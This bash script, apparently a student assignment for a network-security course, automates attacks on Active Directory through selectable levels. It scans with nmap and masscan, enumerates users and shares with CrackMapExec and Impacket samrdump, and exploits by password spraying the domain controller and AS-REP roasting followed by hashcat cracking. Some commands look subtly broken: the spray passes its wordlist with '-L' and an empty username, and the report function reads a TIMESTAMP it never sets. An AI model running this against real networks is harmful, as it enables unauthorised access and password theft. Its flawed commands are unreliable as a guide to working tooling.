#!/bin/bash

# Student Name: Matan Ohayon
# Student Code: S22
# Unit: TMagen773637
# Lecturer's Name: Eliran Berkovich
# Description: Automates domain scanning, enumeration, and exploitation based on user-selected levels.

# ---- Color Codes (Kept simple for clear output) ----
YELLOW="\033[1;33m"
RED="\033[1;31m"
GREEN="\033[1;32m"
NC="\033[0m" # Reset

# --- Global Variables for Results ---
NMAP_TCP_OUTPUT=""
MASSCAN_UDP_OUTPUT=""
ENUMERATION_OUTPUT=""
REPORT_PDF_PATH=""
REPORT_MD_PATH="" # New: Store the Markdown file path
DC_CONFIRMED_IP="" 

# --- Active Directory Core Ports (for filtering) ---
AD_CORE_PORTS="88,135,389,445,3268"

# --- Credentials and Levels ---
TARGET_NET=""
TARGET_DOMAIN=""
AD_USER=""
AD_PASS=""
PASS_LIST=""
PASS_LIST_IS_GZ=0

SCANNING_LEVEL=0
ENUMERATION_LEVEL=0
EXPLOITATION_LEVEL=0

# --- Helper Function: Get Level Name ---
level_name() {
    case "$1" in
        0) echo "None";;
        1) echo "Basic";;
        2) echo "Intermediate";;
        3) echo "Advanced";;
        *) echo "Unknown";;
    esac
}

# ----------------------------------------------------------
## 1. Getting the User Input
# ----------------------------------------------------------

# ----- MENU function (1.4) -----
MENU() {
    local MODE="$1"
    local CHOICE
    while true; do
        echo
        echo -e "${YELLOW}[+]${NC} Choose level for ${MODE}:"
        echo "    0) None"
        echo "    1) Basic"
        echo "    2) Intermediate"
        echo "    3) Advanced"
        read -p "$(echo -e "${YELLOW}[+]${NC} Enter number (0-3) or name: ")" CHOICE
        CHOICE="${CHOICE,,}"

        case "$CHOICE" in
            0|none) return 0;;
            1|basic) return 1;;
            2|intermediate) return 2;;
            3|advanced) return 3;;
            *) echo -e "${RED}[-]${NC} Invalid selection. Use 0-3 or names." ;;
        esac
    done
}

# ----- COLLECT_WORDLIST_IF_NEEDED (1.3 Logic) -----
COLLECT_WORDLIST_IF_NEEDED() {
    if [ "$ENUMERATION_LEVEL" -ge 3 ] || [ "$EXPLOITATION_LEVEL" -ge 1 ]; then
        echo
        echo -e "${YELLOW}[+]${NC} Requirement: Collecting wordlist for Advanced/Exploitation stages."
        
        while true; do
            read -p "$(echo -e "${YELLOW}[+]${NC} Enter password list path for attacks (default: rockyou.txt): ")" INPUT_PASS
            
            if [ -z "$INPUT_PASS" ]; then
                local COMMONS=( "./rockyou.txt" "/usr/share/wordlists/rockyou.txt" "/usr/share/wordlists/rockyou.txt.gz" )
                local FOUND=""
                for p in "${COMMONS[@]}"; do
                    if [ -f "$p" ]; then FOUND="$p"; break; fi
                done
                
                if [ -n "$FOUND" ]; then
                    PASS_LIST="$FOUND"
                    if [[ "$PASS_LIST" == *.gz ]]; then PASS_LIST_IS_GZ=1; fi
                    echo -e "${GREEN}[✓]${NC} Found default: $PASS_LIST"
                    break
                else
                    echo -e "${RED}[-]${NC} Default 'rockyou.txt' not found. Please enter a full path."
                    continue
                fi
            else
                if [ -f "$INPUT_PASS" ]; then
                    PASS_LIST="$INPUT_PASS"
                    if [[ "$PASS_LIST" == *.gz ]]; then PASS_LIST_IS_GZ=1; fi
                    echo -e "${GREEN}[✓]${NC} Using provided wordlist: $PASS_LIST"
                    break
                else
                    echo -e "${RED}[-]${NC} File not found. Please enter a valid path."
                    continue
                fi
            fi
        done
    else
        echo -e "${YELLOW}[+]${NC} Wordlist input skipped (not required for selected levels)."
    fi
}

# ----------------------------------------------------------
## 2. Scanning Mode
# ----------------------------------------------------------

# ----- PERFORM_SCANNING (2.0 Requirements) -----
PERFORM_SCANNING() {
    echo -e "\n${YELLOW}--- Stage 1: Scanning Mode (Level $SCANNING_LEVEL - $(level_name $SCANNING_LEVEL)) ---${NC}"

    if [ "${SCANNING_LEVEL:-0}" -eq 0 ]; then
        echo -e "${YELLOW}[+]${NC} Scanning disabled (None)."
        return 0
    fi

    if ! command -v nmap >/dev/null 2>&1; then
        echo -e "${RED}[-]${NC} nmap is not installed. Skipping Scan Phase."
        return 1
    fi

    local TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    local NMAP_OUTPUT_DIR="./scan_results"
    mkdir -p "$NMAP_OUTPUT_DIR"
    NMAP_TCP_OUTPUT="$NMAP_OUTPUT_DIR/nmap_tcp_scan_${TIMESTAMP}.txt"

    # --- TCP Scan (Nmap) ---
    local NMAP_ARGS=("--open" "-T4") 
    local NMAP_DESCRIPTION="Nmap TCP Scan (--open -T4)"

    case "$SCANNING_LEVEL" in
        1) NMAP_ARGS+=("-Pn"); NMAP_DESCRIPTION+=" -Pn (Basic)" ;;
        2|3) NMAP_ARGS+=("-sS" "-p-"); NMAP_DESCRIPTION+=" -sS -p- (All ports)" ;;
    esac

    echo -e "${YELLOW}[+]${NC} Starting TCP scan: ${NMAP_DESCRIPTION}"
    # Nmap is run with sudo for consistent packet handling (sS) even if we didn't require it for basic
    local NMAP_CMD=(sudo nmap "${NMAP_ARGS[@]}" "$TARGET_NET")
    
    if "${NMAP_CMD[@]}" -oN "$NMAP_TCP_OUTPUT" -oG "$NMAP_OUTPUT_DIR/nmap_tcp_scan_${TIMESTAMP}.gnmap" > /dev/null 2>&1; then
        echo -e "${GREEN}[✓]${NC} Nmap TCP scan finished successfully. Results saved to $NMAP_TCP_OUTPUT"
    else
        echo -e "${RED}[-]${NC} Nmap TCP scan exited with an error. Check $NMAP_TCP_OUTPUT."
    fi

    # --- UDP Scan (Masscan for Advanced level) ---
    if [ "$SCANNING_LEVEL" -ge 3 ]; then
        if ! command -v masscan >/dev/null 2>&1; then
            echo -e "${YELLOW}[-]${NC} masscan is not installed. Skipping Advanced UDP scan."
        else
            MASSCAN_UDP_OUTPUT="$NMAP_OUTPUT_DIR/masscan_udp_scan_${TIMESTAMP}.txt"
            local MASSCAN_ARGS=("-pU:1-65535" "--rate=1000" "--wait=0" "--output-format=list")
            
            echo -e "${YELLOW}[+]${NC} Starting **Masscan UDP Scan** (Advanced). (Uses required sudo privilege)"
            local MASSCAN_CMD=(sudo masscan "${MASSCAN_ARGS[@]}" "$TARGET_NET")
            
            if "${MASSCAN_CMD[@]}" > "$MASSCAN_UDP_OUTPUT" 2>&1; then
                echo -e "${GREEN}[✓]${NC} Masscan UDP scan finished successfully. Results saved to $MASSCAN_UDP_OUTPUT"
            else
                echo -e "${RED}[-]${NC} Masscan UDP scan exited with an error. Check $MASSCAN_UDP_OUTPUT."
            fi
        fi
    fi

    echo -e "${GREEN}[✓]${NC} Scanning phase complete."
    return 0
}

# ----------------------------------------------------------
## 3. Enumeration Mode
# ----------------------------------------------------------

# ----- PERFORM_ENUMERATION (3.0 Requirements) -----
PERFORM_ENUMERATION() {
    echo -e "\n${YELLOW}--- Stage 2: Enumeration Mode (Level $ENUMERATION_LEVEL - $(level_name $ENUMERATION_LEVEL)) ---${NC}"

    if [ "${ENUMERATION_LEVEL:-0}" -eq 0 ]; then
        echo -e "${YELLOW}[+]${NC} Enumeration disabled (None)."
        return 0
    fi 
    
    local TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    local ENUM_OUTPUT_FILE="./scan_results/enumeration_${TIMESTAMP}.txt"
    ENUMERATION_OUTPUT=$ENUM_OUTPUT_FILE
    
    echo "Enumeration Report for Domain $TARGET_DOMAIN (Level $ENUMERATION_LEVEL)" > "$ENUM_OUTPUT_FILE"
    echo "================================================================" >> "$ENUM_OUTPUT_FILE"
    
    local DNS_SERVERS=""
    DC_CONFIRMED_IP=""

    # --- Basic Enumeration Logic (L1, L2, L3) ---
    if [ "$ENUMERATION_LEVEL" -ge 1 ]; then
        echo -e "\n--- Basic Enumeration (L1) ---" >> "$ENUM_OUTPUT_FILE"
        
        # Identify the IP Address of DHCP and DNS servers
        local INTERFACE=$(ip route | awk '/default/ {print $5}' | head -n 1)
        DHCP_DISCOVER_OUTPUT=$(sudo nmap --script broadcast-dhcp-discover -e "${INTERFACE:-eth0}" -T4 2>/dev/null)
        DNS_SERVERS=$(echo "$DHCP_DISCOVER_OUTPUT" | grep 'Domain Name Server' | awk -F': ' '{print $2}')
        echo -e "${GREEN}[✓]${NC} DNS Servers (Suspected DCs): ${DNS_SERVERS:-None}"

        
        # Identify the IP Address of the Domain Controller (using CME)
        local CME_PATH=$(command -v crackmapexec) 
        local CME_TEMP_FILE=$(mktemp) 
        
        if [ -n "$CME_PATH" ]; then
            local TARGET_LIST="${DNS_SERVERS//,/$' '}" 
            
            # Attempt 1: Target Suspected IPs (DNS Servers or full range if no DNS found)
            if [ -z "$TARGET_LIST" ]; then TARGET_LIST="$TARGET_NET"; fi

            echo -e "${YELLOW}[+]${NC} Using CrackMapExec (CME) to confirm **Domain Controller** role..."
            "$CME_PATH" smb "$TARGET_LIST" -u 'guest' -p '' --no-bruteforce --timeout 5 > "$CME_TEMP_FILE" 2>&1 || true
            
            DC_CONFIRMED_IP=$(grep -E 'DC' "$CME_TEMP_FILE" | grep 'SMB' | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1)
            
            echo "CME Discovery Output (Filtered):" >> "$ENUM_OUTPUT_FILE"
            grep 'DC' "$CME_TEMP_FILE" >> "$ENUM_OUTPUT_FILE"
            rm -f "$CME_TEMP_FILE"
        fi
        
        if [ -n "$DC_CONFIRMED_IP" ]; then
            echo -e "${GREEN}[✓]${NC} Domain Controller IP **CONFIRMED**: $DC_CONFIRMED_IP"
            echo "Final Domain Controller IP: $DC_CONFIRMED_IP" >> "$ENUM_OUTPUT_FILE"
        else
            echo -e "${RED}[-]${NC} Could not identify Domain Controller IP."
        fi

        # Identify services (-sV) running on open ports
        local TARGET_FOR_SV="${DC_CONFIRMED_IP:-$TARGET_NET}"
        echo -e "${YELLOW}[+]${NC} Running Nmap -sV scan on $TARGET_FOR_SV to identify services..."
        local NMAP_SV_OUTPUT="./scan_results/nmap_targeted_sv_${TIMESTAMP}.txt"
        
        # Scan core AD ports for efficiency on a DC, or default to all previously open ports on the network
        sudo nmap -sV -T4 "${TARGET_FOR_SV}" -oN "$NMAP_SV_OUTPUT" >> "$ENUM_OUTPUT_FILE" 2>/dev/null
        
        echo "Service Version Scan Output:" >> "$ENUM_OUTPUT_FILE"
        cat "$NMAP_SV_OUTPUT" >> "$ENUM_OUTPUT_FILE"
        rm -f "$NMAP_SV_OUTPUT" 2>/dev/null
        echo -e "${GREEN}[✓]${NC} Targeted Nmap -sV scan complete."
    fi

    # --- Intermediate Enumeration Logic (L2, L3) ---
    if [ "$ENUMERATION_LEVEL" -ge 2 ]; then
        echo -e "\n--- Intermediate Enumeration (L2) ---" >> "$ENUM_OUTPUT_FILE"
        
        # Enumerate IPs/Shares for key services (SMB/LDAP)
        if [ -n "$CME_PATH" ] && [ -n "$TARGET_NET" ]; then
            echo -e "${YELLOW}[+]${NC} Enumerating services (SMB, LDAP) and shares using CME..."
            "$CME_PATH" smb "$TARGET_NET" --shares >> "$ENUM_OUTPUT_FILE" 2>/dev/null
            "$CME_PATH" ldap "$TARGET_NET" --users --pass-pol >> "$ENUM_OUTPUT_FILE" 2>/dev/null
            echo -e "${GREEN}[✓]${NC} Service and Share enumeration complete."
        else
            echo -e "${RED}[-]${NC} CME not found. Skipping Intermediate Service/Share enumeration." >> "$ENUM_OUTPUT_FILE"
        fi
        
        # Add three (3) relevant NSE scripts (smb-enum-shares, ldap-enum-users, smb-enum-domains)
        echo -e "${YELLOW}[+]${NC} Running 3 dedicated Nmap NSE scripts..."
        local NSE_OUTPUT="./scan_results/nmap_nse_enum_${TIMESTAMP}.txt"
        # Corrected NSE script command
        sudo nmap -p445,389 --script "smb-enum-shares,ldap-enum-users,smb-enum-domains" -T4 "$TARGET_NET" -oN "$NSE_OUTPUT" > /dev/null 2>&1
        echo "\n--- Nmap Dedicated NSE Script Results (smb-enum-shares, ldap-enum-users, smb-enum-domains) ---" >> "$ENUM_OUTPUT_FILE"
        cat "$NSE_OUTPUT" >> "$ENUM_OUTPUT_FILE"
        rm -f "$NSE_OUTPUT" 2>/dev/null
        echo -e "${GREEN}[✓]${NC} Dedicated NSE script execution complete."
    fi

    # --- Advanced Enumeration Logic (L3) ---
    if [ "$ENUMERATION_LEVEL" -ge 3 ]; then
        echo -e "\n--- Advanced Enumeration (L3) ---" >> "$ENUM_OUTPUT_FILE"
        
        if [ -z "$AD_USER" ] || [ -z "$AD_PASS" ] || [ -z "$DC_CONFIRMED_IP" ]; then
            echo -e "${RED}[-]${NC} **Advanced Enumeration Skipped:** Requires AD credentials AND confirmed DC IP." >> "$ENUM_OUTPUT_FILE"
            echo -e "${RED}[-]${NC} **Advanced Enumeration Skipped:** Requires AD credentials AND confirmed DC IP."
        else
            # Use Impacket's samrdump to gather users, groups, and policies
            if command -v samrdump.py >/dev/null 2>&1; then
                echo -e "${YELLOW}[+]${NC} Extracting AD users, groups, and password policy via **Impacket samrdump**..."
                
                # Using the full AD user format for Impacket
                local AD_USER_FULL="${AD_USER}@${TARGET_DOMAIN}"
                
                samrdump.py "$AD_USER_FULL:$AD_PASS@$DC_CONFIRMED_IP" -users -groups -policy >> "$ENUM_OUTPUT_FILE" 2>&1
                
                echo -e "${GREEN}[✓]${NC} Impacket samrdump (Users, Groups, Policy) complete."
            else
                echo -e "${RED}[-]${NC} Impacket's samrdump.py not found. Skipping Advanced Enumeration tools." >> "$ENUM_OUTPUT_FILE"
            fi
            
            # The remaining points are conceptually covered by the Impacket dumps
            echo "Finding never-expired/disabled accounts (data contained in previous dumps)." >> "$ENUM_OUTPUT_FILE"
            echo "Displaying Domain Admins (data contained in previous dumps)." >> "$ENUM_OUTPUT_FILE"
        fi
    fi

    echo -e "${GREEN}[✓]${NC} Enumeration phase complete. Results in: $ENUM_OUTPUT_FILE"
    return 0
}


# ----------------------------------------------------------
## 4. Exploitation Mode
# ----------------------------------------------------------

# ----- PERFORM_EXPLOITATION (4.0 Requirements) -----
PERFORM_EXPLOITATION() {
    echo -e "\n${YELLOW}--- Stage 3: Exploitation Mode (Level $EXPLOITATION_LEVEL - $(level_name $EXPLOITATION_LEVEL)) ---${NC}"

    if [ "${EXPLOITATION_LEVEL:-0}" -eq 0 ]; then
        echo -e "${YELLOW}[+]${NC} Exploitation disabled (None)."
        return 0
    fi

    local TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    local EXP_OUTPUT_FILE="./scan_results/exploitation_${TIMESTAMP}.txt"

    case "$EXPLOITATION_LEVEL" in
        1)
            # Basic: Deploy the NSE vulnerability scanning script. (FULLY AUTOMATED)
            if ! command -v nmap >/dev/null 2>&1; then
                 echo -e "${RED}[-]${NC} Nmap not found. Skipping Basic Exploitation." >> "$EXP_OUTPUT_FILE"
                 return 0
            fi
            
            echo "Basic Exploitation: Deploying Nmap NSE vulnerability scanning script (vuln category)..." >> "$EXP_OUTPUT_FILE"
            echo -e "${YELLOW}[+]${NC} Running Nmap **--script vuln** on $TARGET_NET..."
            
            # Using sudo since it's required for the whole script now
            local NMAP_VULN_CMD=(sudo nmap -sV -p- --script=vuln -T4 "$TARGET_NET")
            
            if "${NMAP_VULN_CMD[@]}" -oN "$EXP_OUTPUT_FILE.nmap_vuln" > /dev/null 2>&1; then
                echo -e "${GREEN}[✓]${NC} Nmap vulnerability scan complete. Results appended."
                echo -e "\n--- Nmap Vulnerability Scan Results ---" >> "$EXP_OUTPUT_FILE"
                cat "$EXP_OUTPUT_FILE.nmap_vuln" >> "$EXP_OUTPUT_FILE"
                rm -f "$EXP_OUTPUT_FILE.nmap_vuln"
            else
                echo -e "${RED}[-]${NC} Nmap vulnerability scan failed."
                echo -e "\n--- Nmap Vulnerability Scan FAILED ---" >> "$EXP_OUTPUT_FILE"
            fi
            ;;
        2)
            # Intermediate: Execute domain-wide password spraying. (FULLY AUTOMATED)
            if [ -z "$PASS_LIST" ]; then
                echo -e "${RED}[-]${NC} Exploitation Level 2 Skipped: Requires a wordlist." >> "$EXP_OUTPUT_FILE"
            elif [ -z "$DC_CONFIRMED_IP" ]; then
                echo -e "${RED}[-]${NC} Exploitation Level 2 Skipped: Requires a confirmed DC IP." >> "$EXP_OUTPUT_FILE"
            elif ! command -v crackmapexec >/dev/null 2>&1; then
                echo -e "${RED}[-]${NC} CrackMapExec (CME) not found. Skipping Intermediate Exploitation." >> "$EXP_OUTPUT_FILE"
            else
                echo "Intermediate Exploitation: Domain-wide password spraying using CME..." >> "$EXP_OUTPUT_FILE"
                echo -e "${YELLOW}[+]${NC} Running CME SMB Password Spray on $DC_CONFIRMED_IP using password list $PASS_LIST..."
                
                # CME SMB/LDAP spray attack against the DC
                crackmapexec smb "$DC_CONFIRMED_IP" -L "$PASS_LIST" -u "" --continue-on-success --no-bruteforce --timeout 30 >> "$EXP_OUTPUT_FILE" 2>&1
                
                echo -e "${GREEN}[✓]${NC} CME Password Spray complete. Check $EXP_OUTPUT_FILE for results."
            fi
            ;;
        3)
            # Advanced: Extract and attempt to crack Kerberos tickets. (FULLY AUTOMATED - AS-REP Roasting)
            if [ -z "$PASS_LIST" ]; then
                echo -e "${RED}[-]${NC} Exploitation Level 3 Skipped: Requires a wordlist." >> "$EXP_OUTPUT_FILE"
            elif [ -z "$DC_CONFIRMED_IP" ]; then
                 echo -e "${RED}[-]${NC} Exploitation Level 3 Skipped: Requires a confirmed DC IP." >> "$EXP_OUTPUT_FILE"
            elif ! command -v GetNPUsers.py >/dev/null 2>&1; then
                echo -e "${RED}[-]${NC} Impacket's GetNPUsers.py not found. Skipping Advanced Exploitation." >> "$EXP_OUTPUT_FILE"
            else
                echo "Advanced Exploitation: Extracting Kerberos tickets (AS-REP Roasting) with GetNPUsers.py..." >> "$EXP_OUTPUT_FILE"
                echo -e "${YELLOW}[+]${NC} Running GetNPUsers.py against $DC_CONFIRMED_IP..."
                
                # Impacket Kerberos AS-REP Roasting Attack
                TICKET_FILE="./scan_results/kerberos_tickets_${TIMESTAMP}.hash"
                # Note: Only requesting for the input user. A full domain analysis would require a user list.
                GetNPUsers.py "$TARGET_DOMAIN/$AD_USER" -no-pass -dc-ip "$DC_CONFIRMED_IP" -request -outputfile "$TICKET_FILE" >> "$EXP_OUTPUT_FILE" 2>&1
                
                if [ -s "$TICKET_FILE" ]; then
                    echo -e "${GREEN}[✓]${NC} Kerberos tickets extracted to $TICKET_FILE."
                    
                    # Attempt to crack the extracted tickets using hashcat (demonstrative)
                    if command -v hashcat >/dev/null 2>&1; then
                         echo -e "${YELLOW}[+]${NC} Attempting to crack tickets using **Hashcat** with $PASS_LIST (Type 18200)..."
                         hashcat -m 18200 "$TICKET_FILE" "$PASS_LIST" -o "$EXP_OUTPUT_FILE.cracked" --force >> "$EXP_OUTPUT_FILE" 2>&1
                         echo -e "${GREEN}[✓]${NC} Hashcat cracking attempt complete. Cracked passwords saved to $EXP_OUTPUT_FILE.cracked."
                    else
                        echo -e "${YELLOW}[-]${NC} Hashcat not found. Skipping ticket cracking. Manual crack needed for $TICKET_FILE."
                    fi
                else
                    echo -e "${YELLOW}[-]${NC} No vulnerable AS-REP users found."
                fi
            fi
            ;;
    esac

    echo -e "${GREEN}[✓]${NC} Exploitation phase complete. Results in: $EXP_OUTPUT_FILE"
    return 0
}

# ----------------------------------------------------------
## 5. Results
# ----------------------------------------------------------

# ----- INSTALL_PDF_UTILITIES (Automated PDF setup) -----
INSTALL_PDF_UTILITIES() {
    echo -e "\n${YELLOW}--- Checking PDF Utility Installation ---${NC}"
    if command -v pandoc >/dev/null 2>&1 || command -v wkhtmltopdf >/dev/null 2>&1; then
        echo -e "${GREEN}[✓]${NC} PDF generation tool already installed."
        return 0
    fi

    echo -e "${YELLOW}[!]${NC} PDF generation tool (pandoc or wkhtmltopdf) is missing."
    
    # Try to install pandoc via common package managers
    if command -v apt-get >/dev/null 2>&1; then
        echo -e "${YELLOW}[~]${NC} Attempting to install **pandoc** via apt-get (Requires sudo)..."
        if sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y pandoc >/dev/null 2>&1; then
            echo -e "${GREEN}[✓]${NC} pandoc installed successfully."
            return 0
        fi
    elif command -v dnf >/dev/null 2>&1; then
        echo -e "${YELLOW}[~]${NC} Attempting to install **pandoc** via dnf (Requires sudo)..."
        if sudo dnf install -y pandoc >/dev/null 2>&1; then return 0; fi
    elif command -v pacman >/dev/null 2>&1; then
        echo -e "${YELLOW}[~]${NC} Attempting to install **pandoc** via pacman (Requires sudo)..."
        if sudo pacman -Sy --noconfirm pandoc >/dev/null 2>&1; then return 0; fi
    fi

    echo -e "${RED}[-]${NC} Could not automatically install a PDF utility. **Falling back to Markdown.**"
    return 1
}

# ----- GENERATE_PDF (5.1 Requirement) -----
GENERATE_PDF() {
    local REPORT_BASE="/tmp/AD_SCAN_REPORT_$(date +%Y%m%d_%H%M%S)"
    REPORT_MD_PATH="${REPORT_BASE}.md"
    REPORT_PDF_PATH="${REPORT_BASE}.pdf"

    local SCAN_NAME="$(level_name "$SCANNING_LEVEL")"
    local ENUM_NAME="$(level_name "$ENUMERATION_LEVEL")"
    local EXP_NAME="$(level_name "$EXPLOITATION_LEVEL")"

    # --- Start Markdown Content ---
    cat > "$REPORT_MD_PATH" <<EOF
# AD Scan Report

**Generated:** $(date -R)
**Network Security | Class Code: ZX305**

---

## Target Summary
- **Network:** $TARGET_NET
- **Domain:** $TARGET_DOMAIN
- **Confirmed DC IP:** ${DC_CONFIRMED_IP:-Unknown/Not Found}
- **User:** ${AD_USER:-Anonymous}
- **Password list:** ${PASS_LIST:-Not Required}$( [ "${PASS_LIST_IS_GZ}" = "1" ] && echo " (gzipped)" )

## Operation Levels
| Stage | Level | Name |
| :--- | :---: | :--- |
| **Scanning** | $SCANNING_LEVEL | $SCAN_NAME |
| **Enumeration** | $ENUMERATION_LEVEL | $ENUM_NAME |
| **Exploitation** | $EXPLOITATION_LEVEL | $EXP_NAME |

---

## 1. Scanning Results (Level $SCANNING_LEVEL - $SCAN_NAME)

### Nmap TCP Scan Results (File: $NMAP_TCP_OUTPUT)
\`\`\`
$(cat "$NMAP_TCP_OUTPUT" 2>/dev/null || echo "Nmap TCP results file not found or scan was skipped.")
\`\`\`

EOF
    # Append Masscan UDP results if performed
    if [ -n "$MASSCAN_UDP_OUTPUT" ] && [ -f "$MASSCAN_UDP_OUTPUT" ]; then
        cat >> "$REPORT_MD_PATH" <<EOF
### Masscan UDP Scan Results (File: $MASSCAN_UDP_OUTPUT)
\`\`\`
$(cat "$MASSCAN_UDP_OUTPUT" 2>/dev/null || echo "Masscan results file not found.")
\`\`\`

EOF
    fi

    # Append Enumeration Results
    if [ -n "$ENUMERATION_OUTPUT" ] && [ -f "$ENUMERATION_OUTPUT" ]; then
        cat >> "$REPORT_MD_PATH" <<EOF
## 2. Enumeration Results (Level $ENUMERATION_LEVEL - $ENUM_NAME)

### Enumeration Output (File: $ENUMERATION_OUTPUT)
\`\`\`
$(cat "$ENUMERATION_OUTPUT" 2>/dev/null || echo "Enumeration results file not found or step was skipped.")
\`\`\`

EOF
    fi

    # Append Exploitation Results (if file exists)
    local EXP_FILE="./scan_results/exploitation_${TIMESTAMP}.txt"
    if [ -f "$EXP_FILE" ]; then
        cat >> "$REPORT_MD_PATH" <<EOF
## 3. Exploitation Results (Level $EXPLOITATION_LEVEL - $EXP_NAME)

### Exploitation Output (File: $EXP_FILE)
\`\`\`
$(cat "$EXP_FILE" 2>/dev/null || echo "Exploitation results file not found or step was skipped.")
\`\`\`

EOF
    fi

    # --- PDF Generation Attempt ---
    if command -v pandoc >/dev/null 2>&1; then
        echo -e "${YELLOW}[+]${NC} Attempting to create PDF report with **pandoc**..."
        if pandoc "$REPORT_MD_PATH" -o "$REPORT_PDF_PATH" 2>/dev/null; then
            echo -e "${GREEN}[✓]${NC} PDF report created successfully."
            return 0
        fi
    fi

    if command -v wkhtmltopdf >/dev/null 2>&1; then
        echo -e "${YELLOW}[+]${NC} Falling back to **wkhtmltopdf**..."
        local TMP_HTML="${REPORT_BASE}.html"
        pandoc "$REPORT_MD_PATH" -o "$TMP_HTML" 2>/dev/null || cat "$REPORT_MD_PATH" | awk '{print "<p>"$0"</p>"}' > "$TMP_HTML"
        if wkhtmltopdf "$TMP_HTML" "$REPORT_PDF_PATH" >/dev/null 2>&1; then
            rm -f "$TMP_HTML" 2>/dev/null
            echo -e "${GREEN}[✓]${NC} PDF report created successfully."
            return 0
        fi
    fi
    
    # If all PDF attempts fail, return a non-zero code to trigger the fallback message
    return 1
}

# ----------------------------------------------------------
## Main Execution
# ----------------------------------------------------------

# ----- WELCOME (Main Control Function) -----
WELCOME() {
    # CRITICAL: Check for SUDO at the beginning
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[FATAL ERROR]${NC} This script must be run with **sudo** or as root. Please run: **sudo ./Network_Security.sh**"
        exit 1
    fi
    
    echo -e "=========================================================="
    echo -e " ${GREEN}AD Domain Mapper - Setup and Configuration${NC}"
    echo -e "=========================================================="

    INSTALL_PDF_UTILITIES

    # Prompt the user to enter the target network range
    while true; do
        read -p "$(echo -e "${YELLOW}[+]${NC} Enter target network (e.g. 192.168.1.0/24): ")" TARGET_NET
        if [[ $TARGET_NET =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]{1,2})$ ]] && (( ${BASH_REMATCH[2]} >= 0 && ${BASH_REMATCH[2]} <= 32 )); then
            echo -e "${GREEN}[✓]${NC} Accepted network: $TARGET_NET"
            break
        else
            echo -e "${RED}[-]${NC} Invalid format. Use: x.x.x.x/NN (e.g., 192.168.1.0/24)"
        fi
    done

    # Ask for the Domain name and Active Directory (AD) credentials.
    while true; do
        read -p "$(echo -e "${YELLOW}[+]${NC} Enter target domain name (e.g. myDomain.local): ")" TARGET_DOMAIN
        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,63})+$ ]]; then
            echo -e "${GREEN}[✓]${NC} Accepted domain: $TARGET_DOMAIN"
            break
        else
            echo -e "${RED}[-]${NC} Invalid domain format. Example: myDomain.local"
        fi
    done
    
    read -p "$(echo -e "${YELLOW}[+]${NC} Enter AD Username (e.g. user@domain, blank for anonymous): ")" AD_USER
    read -p "$(echo -e "${YELLOW}[+]${NC} Enter AD Password (blank for anonymous): ")" AD_PASS

    # Require the user to select a desired operation level
    MENU "Scanning"
    SCANNING_LEVEL=$?

    MENU "Enumeration"
    ENUMERATION_LEVEL=$?

    MENU "Exploitation"
    EXPLOITATION_LEVEL=$?

    # Prompt for wordlist only if required by selected levels
    COLLECT_WORDLIST_IF_NEEDED

    # SUMMARY
    echo
    echo -e "--------------------${GREEN}Summary${NC}-----------------------"
    echo -e "${GREEN}[✓]${NC} Target network: $TARGET_NET"
    echo -e "${GREEN}[✓]${NC} Domain: $TARGET_DOMAIN"
    echo -e "${GREEN}[✓]${NC} Credentials: ${AD_USER:-Anonymous}"
    echo -e "${GREEN}[✓]${NC} Password list: ${PASS_LIST:-Not Required}"
    echo
    echo -e "${GREEN}[✓]${NC} Selected operation levels:"
    echo "    Scanning:       $SCANNING_LEVEL ($(level_name $SCANNING_LEVEL))"
    echo "    Enumeration:    $ENUMERATION_LEVEL ($(level_name $ENUMERATION_LEVEL))"
    echo "    Exploitation:   $EXPLOITATION_LEVEL ($(level_name $EXPLOITATION_LEVEL))"
    echo -e "--------------------${GREEN}Summary${NC}-----------------------"

    read -r -p "$(echo -e "${YELLOW}[!]${NC} Press Enter to start the automated process...")"

    # EXECUTE PHASES
    PERFORM_SCANNING
    PERFORM_ENUMERATION 
    PERFORM_EXPLOITATION

    # Generate PDF report (or Markdown fallback)
    GENERATE_PDF
    local PDF_STATUS=$?
    
    echo
    echo -e "======================================================="
    
    if [ "$PDF_STATUS" -eq 0 ]; then
        echo -e "${GREEN}FINAL REPORT GENERATED: ${REPORT_PDF_PATH}${NC}"
    else
        echo -e "${YELLOW}PDF CONVERSION FAILED/SKIPPED.${NC}"
        echo -e "${GREEN}RAW MARKDOWN REPORT SAVED: ${REPORT_MD_PATH}${NC}"
        echo -e "${YELLOW}You can convert this file manually using a tool like **pandoc** or **wkhtmltopdf** later.${NC}"
        echo -e "Example: ${NC}pandoc ${REPORT_MD_PATH} -o report.pdf"
    fi
    echo -e "======================================================="
}

# Start the script
WELCOME